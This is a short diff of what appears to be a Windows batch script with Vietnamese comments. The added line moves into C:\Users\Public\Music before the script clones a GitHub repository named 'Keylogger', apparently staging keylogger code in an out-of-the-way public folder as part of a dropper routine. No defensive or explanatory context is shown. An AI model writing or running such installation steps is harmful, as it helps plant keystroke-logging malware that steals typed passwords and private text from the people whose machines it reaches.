@@ -65,6 +65,7 @@ echo Khởi động lại file batch...
 exit
 
 :cloneProject
+cd C:\Users\Public\Music
 rem Clone từ link GitHub
 git clone https://github.com/LeDuonng/Keylogger.git
 if %errorLevel% neq 0 goto error
